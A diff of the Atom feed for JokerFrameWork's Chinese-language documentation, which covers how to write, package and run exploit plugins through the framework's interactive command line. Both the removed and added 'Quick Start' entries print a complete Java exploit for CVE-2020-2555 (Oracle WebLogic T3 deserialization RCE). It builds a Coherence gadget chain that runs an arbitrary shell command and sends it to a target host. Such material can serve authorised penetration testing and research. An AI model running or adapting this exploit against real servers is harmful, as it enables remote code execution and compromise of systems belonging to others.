@@ -4,7 +4,7 @@
   <title><![CDATA[Joker Doc]]></title>
   <link href="http://joker.lucifaer.com/atom.xml" rel="self"/>
   <link href="http://joker.lucifaer.com/"/>
-  <updated>2020-04-28T15:27:11+08:00</updated>
+  <updated>2020-06-16T17:43:14+08:00</updated>
   <id>http://joker.lucifaer.com/</id>
   <author>
     <name><![CDATA[]]></name>
@@ -12,228 +12,6 @@
   </author>
   <generator uri="http://www.mweb.im">MWeb</generator>
 
-  
-  <entry>
-    <title type="html"><![CDATA[Quick Start]]></title>
-    <link href="http://joker.lucifaer.com/15878734053106.html"/>
-    <updated>2020-04-26T11:56:45+08:00</updated>
-    <id>http://joker.lucifaer.com/15878734053106.html</id>
-    <content type="html"><![CDATA[
-<p>在<code>JokerFrameWork</code>中编写exploit插件是非常简单的，基本上不需要什么特殊的步骤，exp该怎么写，就怎么写。同时由于使用了多<code>ClassLoader</code>隔离，保证了<code>Joker</code>主程序在使用插件时不会遇到多依赖冲突的问题。本章主要来讲一下如何快速编写一个exploit插件。</p>
-
-<p><code>JokerFrameWork</code>为了更大程度上的便利性，并没有在exp具体代码的编写上进行过多的限制，框架的目的是做归档以及方便展示，而并非增加exp的编写难度。所以<code>JokerFrameWork</code>的设计思路是：</p>
-
-<ul>
-<li>插件代码可以独立运行</li>
-<li>只需要添加几行代码即可将exp转换为Joker可扫描并加载的插件</li>
-</ul>
-
-<p>所以插件开发者应更加注重exp的逻辑，而非框架本身的合理性。</p>
-
-<h2 id="toc_0">0x01 依赖设置</h2>
-
-<p>exploit插件项目的构建方式推荐使用类似于<code>exploitLib</code>项目中多模块项目的构建方式来完成。以下以Gradle为例来说明项目结构。插件项目的结构如下：</p>
-
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/26/15878813380147.jpg" alt=""/></p>
-
-<h3 id="toc_1">1.1 在根项目中导入JokerSDK以供所有子项目使用</h3>
-
-<p>根项目中的<code>build.gradle</code>配置如下：</p>
-
-<pre><code class="language-groovy">allprojects {
-    apply plugin: &#39;java&#39;
-    apply plugin: &#39;idea&#39;
-    sourceCompatibility = 1.8
-}
-
-group &#39;com.lucifaer&#39;
-version &#39;1.0&#39;
-
-subprojects {
-    repositories {
-        mavenCentral()
-    }
-
-    dependencies {
-        compile fileTree(dir: &#39;./lib&#39;, includes: [&#39;*.jar&#39;])
-        testCompile group: &#39;junit&#39;, name: &#39;junit&#39;, version: &#39;4.12&#39;
-    }
-}
-</code></pre>
-
-<p>主要是将<code>lib/</code>目录下所有以<code>.jar</code>结尾的文件当做依赖导入项目中。推荐只将编译好的<code>JokerSDK</code>放到<code>lib</code>目录下，不要引入具体exp的依赖。</p>
-
-<h3 id="toc_2">1.2 在子项目中导入exp所需的具体依赖</h3>
-
-<p>子项目中的<code>build.gradle</code>配置如下：</p>
-
-<pre><code class="language-groovy">plugins {
-    id &#39;java&#39;
-}
-
-group &#39;com.lucifaer.cve-2020-2555(12_2_1_3)&#39;
-version &#39;1.0&#39;
-sourceCompatibility = 1.8
-
-repositories {
-    mavenCentral()
-}
-
-dependencies {
-    compile files(
-            &#39;../lib/JokerSDK-1.0.jar&#39;,
-    )
-    compile fileTree(dir: &#39;./lib&#39;, includes: [&#39;*(12_2_1_3).jar&#39;])
-    testCompile group: &#39;junit&#39;, name: &#39;junit&#39;, version: &#39;4.12&#39;
-}
-
-jar {
-    zip64 = true
-    from configurations.compile.collect { it.isDirectory() ? it : zipTree(it) }
-}
-</code></pre>
-
-<p>有时由于gradle的原因可能没有办法找到<code>JokerSDK</code>的依赖，所以可以手动将其添加进依赖配置中。在子项目的<code>lib</code>中存放具体exp所需的依赖，为了后期方便维护，推荐依赖jar包的名字重命名为<code>组件名(版本名)</code>。</p>
-
-<h2 id="toc_3">0x02 编写exp插件</h2>
-
-<p>在设置好依赖后，就可以进行插件的编写了。</p>
-
-<h3 id="toc_4">2.1 命名规范</h3>
-
-<p>在编写插件前，还有一个需要注意的是插件的命名规范。为了后期方便维护，推荐插件的包名为<code>[groupID].exp.[cve编号]</code>，例如<code>com.lucifaer.exp.cve_2020_2555</code>。</p>
-
-<p>具体类名理论上来说是可以随便写的，但是还是推荐取能简要表明插件内容的类名，这样方便进行归档。</p>
-
-<h3 id="toc_5">2.2 exp具体代码编写</h3>
-
-<p>exp插件的编写主要需要注意以下几个部分：</p>
-
-<ul>
-<li>exp插件类被<code>@Exploitor</code>注解包裹，设置<code>value</code>为插件名。</li>
-<li>exp插件类继承<code>com.lucifaer.jokerframework.sdk.api.BaseExploit</code>抽象类，实现<code>com.lucifaer.jokerframework.sdk.api.Exploit</code>接口。</li>
-<li>在构造方法中定义插件名，并保持名称与<code>@Exploitor</code>注解中<code>value</code>的名称相同。</li>
-<li>重写<code>exploit</code>和<code>documentation</code>两个方法。</li>
-</ul>
-
-<p>基础的exp模板为：</p>
-
-<pre><code class="language-java">package com.lucifaer.exp.cve_2020_2555;
-
-import com.lucifaer.jokerframework.sdk.annotation.Exploitor;
-import com.lucifaer.jokerframework.sdk.api.BaseExploit;
-import com.lucifaer.jokerframework.sdk.api.Exploit;
-import com.lucifaer.jokerframework.sdk.context.ShellContext;
-
-@Exploitor(value = &quot;exp插件名&quot;)
-public class Exp2 extends BaseExploit implements Exploit {
-    public static void main(String[] args) {
-        ShellContext shellContext = new ShellContext();
-        Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
-        // 模仿Joker中用户填充参数的代码
-        params.put(&quot;targetUrl&quot;, &quot;127.0.0.1&quot;);
-        params.put(&quot;targetPort&quot;, &quot;7001&quot;);
-        params.put(&quot;command&quot;, &quot;open /System/Applications/Calculator.app&quot;);
-        shellContext.setParams(params);
-        Exploit exploit = new Exp2();
-        exploit.exploit(shellContext);
-    }
-
-    public Exp2() {
-        // 设置exp名称，与value保持一致
-        this.exploitName = &quot;cve-2020-2555(12.2.1.3)&quot;;
-        // 设置需要用户必须指定的参数
-        this.requiredParams.add(&quot;targetUrl&quot;);
-        this.requiredParams.add(&quot;targetPort&quot;);
-        this.requiredParams.add(&quot;command&quot;);
-    }
-
-    // 完成具体的exp逻辑
-    @Override
-    public void exploit(ShellContext shellContext) {}
-
-    // exp介绍（帮助）文档
-    @Override
-    public List&lt;String[]&gt; documentation() {
-        return null;
-    }
-}
-</code></pre>
-
-<p>可以看到平时是如何用Java写exp的，现在也照样怎么写，没有任何其他需要提供的地方。如果想使用<code>ysoserial</code>的<code>Reflections</code>和<code>Gadgets</code>类的话，可以直接使用，无需引入<code>ysoserial</code>依赖：</p>
-
-<pre><code class="language-java">import com.lucifaer.jokerframework.sdk.util.yso.util.Gadgets;
-import com.lucifaer.jokerframework.sdk.util.yso.util.Reflections;
-import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
-import com.tangosol.util.filter.LimitFilter;
-
-import javax.management.BadAttributeValueExpException;
-import javax.naming.Context;
-import javax.naming.InitialContext;
-import java.rmi.Remote;
-import java.util.HashMap;
-import java.util.Hashtable;
-import java.util.List;
-import java.util.Map;
-
-@Override
-    public void exploit(ShellContext shellContext) {
-        Map&lt;String, String&gt; params = shellContext.getParams();
-        String targetUrl = params.get(&quot;targetUrl&quot;);
-        String targetPort = params.get(&quot;targetPort&quot;);
-        String command = params.get(&quot;command&quot;);
-
-        try {
-            String el = &quot;Runtime.getRuntime().exec(\&quot;&quot; + command + &quot;\&quot;)&quot;;
-            MvelExtractor mvelExtractor = new MvelExtractor(el);
-
-            LimitFilter limitFilter = new LimitFilter();
-            Reflections.setFieldValue(limitFilter, &quot;m_comparator&quot;, mvelExtractor);
-            Reflections.setFieldValue(limitFilter, &quot;m_oAnchorTop&quot;, Runtime.class);
-            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
-            Reflections.setFieldValue(badAttributeValueExpException, &quot;val&quot;, limitFilter);
-
-            Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();
-            env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;weblogic.jndi.WLInitialContextFactory&quot;);
-            env.put(Context.PROVIDER_URL, String.format(&quot;t3://%s:%s&quot;, targetUrl, targetPort));
-            try {
-                Context context = new InitialContext(env);
-                String name = &quot;lucifaer&quot;;
-                Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, badAttributeValueExpException), Remote.class);
-                context.rebind(&quot;lucifaer&quot;, remote);
-            }catch (Exception e) {
-                e.printStackTrace();
-            }
-        }catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-</code></pre>
-
-<h3 id="toc_6">2.3 创建并设置exploitPlugin.properties</h3>
-
-<p>在具体的exp代码编写结束后，在<code>resources</code>目录下创建一个<code>exploitPlugin.properties</code>，设置插件的相关信息：</p>
-
-<ul>
-<li><code>pluginName</code>：插件名，与exp中<code>@Exploitor</code>注解的<code>value</code>名称相同。</li>
-<li><code>referencePath</code>：exp具体实现类路径。如<code>com.lucifaer.exp.cve_2020_2555.Exp2</code></li>
-</ul>
-
-<p>同样以上面的<code>cve-2020-2555(12.2.1.3)</code>插件为例，其对应的<code>exploitPlugin.properties</code>为：</p>
-
-<pre><code class="language-text">pluginName = cve-2020-2555(12.2.1.3)
-referencePath = com.lucifaer.exp.cve_2020_2555.Exp2
-</code></pre>
-
-<h2 id="toc_7">0x03 打包插件</h2>
-
-<p>exploit插件没有需要特别注意的打包细节，直接执行如下命令打为jar包即可：</p>
-
-<pre><code class="language-text">./gradlew build
-</code></pre>
-
-]]></content>
-  </entry>
   
   <entry>
     <title type="html"><![CDATA[基础功能概览]]></title>
@@ -244,7 +22,7 @@ referencePath = com.lucifaer.exp.cve_2020_2555.Exp2
 <p>目前<code>JokerFrameWork</code>提供了以下基础功能：</p>
 
 <ul>
-<li>启动时插件加载</li>
+<li>用时插件加载</li>
 <li>交互式命令行</li>
 <li>开启服务：
 <ul>
@@ -258,25 +36,31 @@ referencePath = com.lucifaer.exp.cve_2020_2555.Exp2
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[启动时插件加载]]></title>
+    <title type="html"><![CDATA[用时插件加载]]></title>
     <link href="http://joker.lucifaer.com/15877194041059.html"/>
     <updated>2020-04-24T17:10:04+08:00</updated>
     <id>http://joker.lucifaer.com/15877194041059.html</id>
     <content type="html"><![CDATA[
-<p>由于项目处于初期阶段，目前的exp还比较少，所以采用的是<strong>加载前将插件都加载进来</strong>的加载方式。加载步骤可以简单的整理为如下几步：</p>
+<p>在<code>JokerFrameWork</code> 1.0.2.REALSE版本中更改了插件加载逻辑，目前采用用时加载插件的形式。</p>
+
+<p>加载逻辑可以简单的总结如下：</p>
 
 <ol>
 <li><code>JokerFrameWork</code>会检测<code>Joker.jar</code>同级目录下是否存在<code>exploitLib</code>目录</li>
 <li>如果存在<code>exploitLib</code>目录，则给每一个<code>.jar</code>文件分配一个<code>ClassLoader</code>用于加载该<code>.jar</code>文件中的所有<code>.class</code>文件</li>
-<li>遍历所有已加载的<code>.class</code>文件，找到存在注解<code>@Exploitor</code>的<code>.class</code>文件，并获取其插件名（exp名）</li>
-<li>将获取到的插件名作为key，将该插件对应的<code>ClassLoader</code>、<code>ReferencePath</code>（引用名）作为值保存在Map中</li>
+<li>遍历所有的<code>.jar</code>文件中的<code>exploitPlugin.properties</code>文件，获取插件名、类加载路径等信息。</li>
+<li>将获取到的插件名作为key，将该插件对应的<code>ClassLoader</code>、<code>ReferencePath</code>（引用名）作为值保存在Map中。</li>
 </ol>
 
 <p>以上的流程都发生在<code>ExploitFactory</code>的初始化中。</p>
 
+<p>在调用<code>exp</code>命令设置一个新的<code>exploit Context</code>后，当利用<code>set exploitName</code>命令设置插件时，完成插件类的实例化。</p>
+
+<p>最终在使用<code>exploit [exp名]</code>时，完成插件的调用。</p>
+
 <p>加载成功结果如下：</p>
 
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/26/15877144006299.jpg" alt=""/></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15921920871305.jpg" alt=""/></p>
 
 ]]></content>
   </entry>
@@ -311,12 +95,11 @@ referencePath = com.lucifaer.exp.cve_2020_2555.Exp2
     <content type="html"><![CDATA[
 <p>交互式命令行主要由<code>SpringShell</code>编写，具体的命令都可以通过<code>help</code>命令进行查看：</p>
 
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/26/15877155220943.jpg" alt=""/></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15921921974320.jpg" alt=""/></p>
 
 <p>目前已知问题：</p>
 
 <ul>
-<li>未做用户友好性优化</li>
 <li>自定义<code>stacktrace</code>命令在返回最近一次错误时可能出现无法显示的问题</li>
 </ul>
 
@@ -389,55 +172,35 @@ jar {
 
 <h3 id="toc_5"><code>exploit</code>插件的基础Gradle配置：</h3>
 
-<pre><code class="language-groovy">plugins {
-    id &#39;java&#39;
+<pre><code class="language-groovy">allprojects {
+    apply plugin: &#39;idea&#39;
+    group &#39;org.jadef1ee&#39;
+    version &#39;1.0&#39;
 }
 
-group &#39;com.lucifaer.cve-2020-2555(12_2_1_4)&#39;
-version &#39;1.0&#39;
-sourceCompatibility = 1.8
 
-repositories {
-    mavenCentral()
-}
 
-dependencies {
-    compile files(
-            &#39;../lib/JokerSDK-1.0.jar&#39;,
-    )
-    compile fileTree(dir: &#39;./lib&#39;, includes: [&#39;*.jar&#39;])
-    testCompile group: &#39;junit&#39;, name: &#39;junit&#39;, version: &#39;4.12&#39;
+subprojects {
+    apply plugin: &#39;java&#39;
+    sourceCompatibility = 1.8
+
+    repositories {
+        mavenCentral()
+    }
+
+    dependencies {
+        compile fileTree(dir: &quot;${rootProject.projectDir}/lib&quot;, include: &#39;*.jar&#39;)
+    }
 }
 
 jar {
-    zip64 = true
-    from configurations.compile.collect { it.isDirectory() ? it : zipTree(it) }
+    from {
+        configurations.runtime.collect {
+            zipTree(it)
+        }
+    }
 }
 </code></pre>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Annotaion（注解）]]></title>
-    <link href="http://joker.lucifaer.com/15877201204168.html"/>
-    <updated>2020-04-24T17:22:00+08:00</updated>
-    <id>http://joker.lucifaer.com/15877201204168.html</id>
-    <content type="html"><![CDATA[
-<p>自定义注解，用于标识exploit插件，目前只包含一个注解用于标识exploit插件。</p>
-
-<h2 id="toc_0">0x01 Exploitor</h2>
-
-<p>具体的代码如下：</p>
-
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/26/15878715320043.jpg" alt=""/></p>
-
-<p>该注解接收一个<code>value</code>参数，该参数用于标明插件的名称，一般为<code>CVE编号(对应版本)</code>。</p>
-
-<blockquote>
-<p><strong>注意</strong><br/>
-<code>value</code>的参数将被当做键名注册到主程序中，在主程序执行<code>list exploit</code>或<code>set exploitName</code>命令时，将根据<code>value</code>进行索引，所以一定要保证<code>value</code>参数的准确性</p>
-</blockquote>
 
 ]]></content>
   </entry>
@@ -477,7 +240,7 @@ jar {
 
 <p>最终效果为：</p>
 
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/26/15877183415992.jpg" alt=""/></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922031286412.jpg" alt=""/></p>
 
 <p>目前已知问题：</p>
 
@@ -586,7 +349,7 @@ jar {
 
 <p>会输出类似于如下的信息：</p>
 
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/28/15880571401017.jpg" alt=""/></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922058704915.jpg" alt=""/></p>
 
 <p>列举出的插件名都为后续在<code>exp</code>上下文中需要设置的<code>exploitName</code>的名称。</p>
 
@@ -594,7 +357,7 @@ jar {
 
 <p><code>Joker</code>中<font color="red">exp</font>命令用于创建一个<code>exp</code>上下文，该上下文用于缓存用户设置的命令。</p>
 
-<p>用户在创建<code>exp</code>上下文时必须为该上下文指定一个<code>sessionId</code>，该<code>sessionId</code>用于唯一指定该<code>exp</code>上下文。后续可以利用<code>checkout</code>命令（v4版本还未支持）切换上下文，完成重复攻击。</p>
+<p>用户在创建<code>exp</code>上下文时必须为该上下文指定一个<code>sessionId</code>，该<code>sessionId</code>用于唯一指定该<code>exp</code>上下文。后续可以利用<code>checkout</code>命令（目前版本还未支持）切换上下文，完成重复攻击。</p>
 
 <p>具体命令为：</p>
 
@@ -619,21 +382,27 @@ jar {
 </ul>
 
 <blockquote>
-<p>关于如何确定<code>requiredParams</code>，后续版本中会更新<code>show</code>指令来将exploit插件中的<code>documentation</code>打印出来。</p>
+<p><del>关于如何确定<code>requiredParams</code>，后续版本中会更新<code>show</code>指令来将exploit插件中的<code>documentation</code>打印出来。</del></p>
 
 <p><code>requiredParams</code>是在插件内部确定的，但是在使用时必须填写，否则会返回所需参数缺失的错误提示</p>
 </blockquote>
 
-<p>以<code>cve-2020-2555(12.2.1.3)</code>插件为例，可以首先确定插件的<code>requiredParams</code>包含什么：</p>
+<p><code>Joker</code>中提供了<font color="red">show_options</font>命令用于查看当前插件的应设置的参数，下面以<code>cve-2020-2555(12.2.1.3)</code>插件为例，来具体说明如何进行相关参数查询和参数设置。</p>
 
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/28/15880583184216.jpg" alt=""/></p>
+<p>首先利用<code>set exploitName [exploitName]</code>来设定需要使用的exp插件：</p>
 
-<p>可以看到是必须由用户指定<code>targetUrl</code>、<code>targetPort</code>、<code>command</code>三个参数。在Joker中使用<code>set</code>命令对参数进行指定：</p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922069247308.jpg" alt=""/></p>
+
+<p>在设置了插件后，可以利用<code>show_options</code>命令来查看插件所需要设置的参数：</p>
+
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922069408760.jpg" alt=""/></p>
+
+<p>在Joker中使用<code>set</code>命令对参数进行指定：</p>
 
 <pre><code class="language-text">set [参数名] [参数值]
 </code></pre>
 
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/28/15880585563137.jpg" alt=""/></p>
+<p><img src="media/15877200799086/15880585563137.jpg" alt=""/></p>
 
 <h2 id="toc_4">0x04 执行exp上下文</h2>
 
@@ -644,7 +413,7 @@ jar {
 
 <p>如：</p>
 
-<p><img src="http://image-lucifaer.test.upcdn.net/2020/04/28/15880587208964.jpg" alt=""/></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922074083597.jpg" alt=""/></p>
 
 ]]></content>
   </entry>
@@ -713,11 +482,260 @@ jar {
   </entry>
   
   <entry>
-    <title type="html"><![CDATA[开启服务]]></title>
-    <link href="http://joker.lucifaer.com/15877145916173.html"/>
-    <updated>2020-04-24T15:49:51+08:00</updated>
-    <id>http://joker.lucifaer.com/15877145916173.html</id>
+    <title type="html"><![CDATA[Quick Start]]></title>
+    <link href="http://joker.lucifaer.com/15878734053106.html"/>
+    <updated>2020-04-26T11:56:45+08:00</updated>
+    <id>http://joker.lucifaer.com/15878734053106.html</id>
     <content type="html"><![CDATA[
+<p>在<code>JokerFrameWork</code>中编写exploit插件是非常简单的，基本上不需要什么特殊的步骤，exp该怎么写，就怎么写。同时由于使用了多<code>ClassLoader</code>隔离，保证了<code>Joker</code>主程序在使用插件时不会遇到多依赖冲突的问题。本章主要来讲一下如何快速编写一个exploit插件。</p>
+
+<p><code>JokerFrameWork</code>为了更大程度上的便利性，并没有在exp具体代码的编写上进行过多的限制，框架的目的是做归档以及方便展示，而并非增加exp的编写难度。所以<code>JokerFrameWork</code>的设计思路是：</p>
+
+<ul>
+<li>插件代码可以独立运行</li>
+<li>只需要添加几行代码即可将exp转换为Joker可扫描并加载的插件</li>
+</ul>
+
+<p>所以插件开发者应更加注重exp的逻辑，而非框架本身的合理性。</p>
+
+<h2 id="toc_0">0x01 依赖设置</h2>
+
+<p>exploit插件项目的构建方式推荐使用类似于<code>exploitLib</code>项目中多模块项目的构建方式来完成。以下以Gradle为例来说明项目结构。插件项目的结构如下：</p>
+
+<p><img src="http://image-lucifaer.test.upcdn.net/2020/06/16/15922122129411.jpg" alt=""/></p>
+
+<h3 id="toc_1">1.1 在根项目中导入JokerSDK以供所有子项目使用</h3>
+
+<p>根项目中的<code>build.gradle</code>配置如下：</p>
+
+<pre><code class="language-groovy">allprojects {
+    apply plugin: &#39;idea&#39;
+    group &#39;org.jadef1ee&#39;
+    version &#39;1.0&#39;
+}
+
+
+
+subprojects {
+    apply plugin: &#39;java&#39;
+    sourceCompatibility = 1.8
+
+    repositories {
+        mavenCentral()
+    }
+
+    dependencies {
+        compile fileTree(dir: &quot;${rootProject.projectDir}/lib&quot;, include: &#39;*.jar&#39;)
+    }
+}
+</code></pre>
+
+<p>主要是将<code>lib/</code>目录下所有以<code>.jar</code>结尾的文件当做依赖导入项目中。推荐只将编译好的<code>JokerSDK</code>放到<code>lib</code>目录下，不要引入具体exp的依赖。</p>
+
+<h3 id="toc_2">1.2 在子项目中导入exp所需的具体依赖</h3>
+
+<p>子项目中的<code>build.gradle</code>配置如下：</p>
+
+<pre><code class="language-groovy">dependencies {
+    compile fileTree(dir: &#39;libs&#39;, includes: [&#39;*(12_2_1_3).jar&#39;])
+}
+
+jar {
+    zip64 = true
+    from configurations.compile.collect { it.isDirectory() ? it : zipTree(it) }
+    manifest {
+        attributes &quot;Main-Class&quot; : &quot;org.jadef1ee.exp.weblogic.cve_2020_2555.Exp&quot;
+    }
+}
+</code></pre>
+
+<p>在子项目的<code>lib</code>中存放具体exp所需的依赖，为了后期方便维护，推荐依赖jar包的名字重命名为<code>组件名(版本名)</code>。</p>
+
+<h2 id="toc_3">0x02 编写exp插件</h2>
+
+<p>在设置好依赖后，就可以进行插件的编写了。</p>
+
+<h3 id="toc_4">2.1 命名规范</h3>
+
+<p>在编写插件前，还有一个需要注意的是插件的命名规范。为了后期方便维护，推荐插件的包名为<code>[groupID].exp.[组件名].[cve编号]</code>，例如<code>com.lucifaer.exp.weblogic.cve_2020_2555</code>。</p>
+
+<p>具体类名理论上来说是可以随便写的，但是还是推荐取能简要表明插件内容的类名，这样方便进行归档。</p>
+
+<h3 id="toc_5">2.2 exp具体代码编写</h3>
+
+<p>exp插件的编写主要需要注意以下几个部分：</p>
+
+<ul>
+<li>exp插件类继承<code>com.lucifaer.jokerframework.sdk.api.BaseExploit</code>抽象类，实现<code>com.lucifaer.jokerframework.sdk.api.Exploit</code>接口。</li>
+<li>在构造方法中定义插件名。</li>
+<li>在<code>main</code>方法中将自定义的<code>ConsoleModel</code>设置好。</li>
+<li>重写<code>exploit</code>和<code>documentation</code>两个方法。</li>
+</ul>
+
+<blockquote>
+<p>自定义<code>ConsoleModel</code>相关内容请参考<a href="15922132356913.html">自定义ConsoleModel</a></p>
+</blockquote>
+
+<p>基础的exp模板为：</p>
+
+<pre><code class="language-java">package com.lucifaer.exp.cve_2020_2555;
+
+import com.lucifaer.jokerframework.sdk.api.BaseExploit;
+import com.lucifaer.jokerframework.sdk.api.Exploit;
+import com.lucifaer.jokerframework.sdk.console.CommandHelper;
+import com.lucifaer.jokerframework.sdk.console.DefaultConsoleModel;
+import com.lucifaer.jokerframework.sdk.context.ShellContext;
+
+public class Exp extends BaseExploit implements Exploit {
+    public static void main(String[] args) {
+        // 设置插件单独运行时的参数解析模型，可以根据需求自定义
+        CommandHelper commandHelper = new CommandHelper(new DefaultConsoleModel());
+        ShellContext shellContext = commandHelper.build(args);
+        Exploit exploit = new Exp();
+        exploit.exploit(shellContext);
+    }
+
+    public Exp() {
+        // 设置exp名称，与exploitPlugin.properties文件中的pluginName字段相同
+        this.exploitName = &quot;cve-2020-2555(12.2.1.3)&quot;;
+        // 设置需要用户必须指定的参数，需要与参数解析模型中的参数（即DefaultConsoleModel）保持一致
+        this.requiredParams.add(&quot;targetUrl&quot;);
+        this.requiredParams.add(&quot;targetPort&quot;);
+        this.requiredParams.add(&quot;command&quot;);
+    }
+
+    // 完成具体的exp逻辑
+    @Override
+    public void exploit(ShellContext shellContext) {}
+
+    // exp介绍（帮助）文档
+    @Override
+    public List&lt;String[]&gt; documentation() {
+        return null;
+    }
+}
+</code></pre>
+
+<p>可以看到平时是如何用Java写exp的，现在也照样怎么写，没有任何其他需要提供的地方。如果想使用<code>ysoserial</code>的<code>Reflections</code>和<code>Gadgets</code>类的话，可以直接使用，无需引入<code>ysoserial</code>依赖：</p>
+
+<pre><code class="language-java">package org.jadef1ee.exp.weblogic.cve_2020_2555;
+
+import com.lucifaer.jokerframework.sdk.api.BaseExploit;
+import com.lucifaer.jokerframework.sdk.api.Exploit;
+import com.lucifaer.jokerframework.sdk.console.CommandHelper;
+import com.lucifaer.jokerframework.sdk.console.DefaultConsoleModel;
+import com.lucifaer.jokerframework.sdk.context.ShellContext;
+import com.lucifaer.jokerframework.sdk.util.yso.util.Gadgets;
+import com.lucifaer.jokerframework.sdk.util.yso.util.Reflections;
+import com.tangosol.util.extractor.ChainedExtractor;
+import com.tangosol.util.extractor.ReflectionExtractor;
+import com.tangosol.util.filter.LimitFilter;
+
+import javax.management.BadAttributeValueExpException;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import java.rmi.Remote;
+import java.util.*;
+
+/**
+ * @author Lucifaer
+ * @version 1.0
+ */
+public class Exp extends BaseExploit implements Exploit {
+    public static void main(String[] args) {
+        CommandHelper commandHelper = new CommandHelper(new DefaultConsoleModel());
+        ShellContext shellContext = commandHelper.build(args);
+        Exploit exploit = new Exp();
+        exploit.exploit(shellContext);
+    }
+
+    public Exp() {
+        this.exploitName = &quot;cve-2020-2555(12.2.1.3)&quot;;
+        this.requiredParams.add(&quot;targetUrl&quot;);
+        this.requiredParams.add(&quot;targetPort&quot;);
+        this.requiredParams.add(&quot;command&quot;);
+    }
+
+    @Override
+    public void exploit(ShellContext shellContext) {
+        Map&lt;String, String&gt; params = shellContext.getParams();
+        String targetUrl = params.get(&quot;targetUrl&quot;);
+        String targetPort = params.get(&quot;targetPort&quot;);
+        String command = params.get(&quot;command&quot;);
+
+        try {
+            ReflectionExtractor extractor1 = new ReflectionExtractor(&quot;getMethod&quot;, new Object[] {&quot;getRuntime&quot;, new Class[0]});
+            ReflectionExtractor extractor2 = new ReflectionExtractor(&quot;invoke&quot;, new Object[] {null, new Object[0]});
+            ReflectionExtractor extractor3 = new ReflectionExtractor(&quot;exec&quot;, new Object[]{new String[]{&quot;/bin/bash&quot;, &quot;-c&quot;, command}});
+            ReflectionExtractor[] extractors = {
+                    extractor1,
+                    extractor2,
+                    extractor3
+            };
+            ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
+
+            LimitFilter limitFilter = new LimitFilter();
+            Reflections.setFieldValue(limitFilter, &quot;m_comparator&quot;, chainedExtractor);
+            Reflections.setFieldValue(limitFilter, &quot;m_oAnchorTop&quot;, Runtime.class);
+
+            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+            Reflections.setFieldValue(badAttributeValueExpException, &quot;val&quot;, limitFilter);
+
+            Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();
+            env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;weblogic.jndi.WLInitialContextFactory&quot;);
+            env.put(Context.PROVIDER_URL, String.format(&quot;t3://%s:%s&quot;, targetUrl, targetPort));
+            try {
+                Context context = new InitialContext(env);
+                String name = &quot;lucifaer&quot;;
+                Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, badAttributeValueExpException), Remote.class);
+                context.rebind(&quot;lucifaer&quot;, remote);
+            }catch (Exception e) {
+                e.printStackTrace();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public List&lt;String[]&gt; documentation() {
+        List&lt;String[]&gt; document = new ArrayList&lt;&gt;();
+        document.add(new String[] {
+                &quot;漏洞名：CVE-2020-2555 Weblogic T3 RCE&quot;
+        });
+        document.add(new String[] {
+                &quot;插件可攻击版本：12.2.1.3&quot;
+        });
+        return document;
+    }
+}
+</code></pre>
+
+<h3 id="toc_6">2.3 创建并设置exploitPlugin.properties</h3>
+
+<p>在具体的exp代码编写结束后，在<code>resources</code>目录下创建一个<code>exploitPlugin.properties</code>，设置插件的相关信息：</p>
+
+<ul>
+<li><code>id</code>：插件编号，与cert预警报告编号相同</li>
+<li><code>pluginName</code>：插件名，与exp中<code>@Exploitor</code>注解的<code>value</code>名称相同。</li>
+<li><code>referencePath</code>：exp具体实现类路径。如<code>com.lucifaer.exp.cve_2020_2555.Exp2</code></li>
+<li><code>tag</code>：用于描述漏洞类型</li>
+</ul>
+
+<p>同样以上面的<code>cve-2020-2555(12.2.1.3)</code>插件为例，其对应的<code>exploitPlugin.properties</code>为：</p>
+
+<pre><code class="language-text">id = 预警报告id（例如：B6-2020-061501）
+pluginName = cve-2020-2555(12.2.1.3)
+referencePath = com.lucifaer.exp.cve_2020_2555.Exp2
+tag = RCE
+</code></pre>
+
+<h2 id="toc_7">0x03 打包插件</h2>
+
+<p>exploit插件没有需要特别注意的打包细节，直接执行如下命令打为jar包即可：</p>
+
+<pre><code class="language-text">./gradlew build
+</code></pre>
 
 ]]></content>
   </entry>
@@ -731,16 +749,6 @@ jar {
 <p>当一个漏洞存在于不同的版本时，其所需要的依赖的版本不同，最终生成的序列化数据的<code>SUID</code>也会不同，这就会导致反序列化出错。而解决多依赖问题的方法就是使用<code>ClassLoader</code>隔离加载，在真实调用时利用相应的<code>ClassLoader</code>反射调用相应的方法。</p>
 
 <p>目前<code>Joker</code>中已经实现了该功能，在编写插件时无需关注多依赖问题，需要什么版本的依赖，就将相应的依赖及exploit代码打包为Fat Jar即可。</p>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Maven打包指南]]></title>
-    <link href="http://joker.lucifaer.com/15877201011471.html"/>
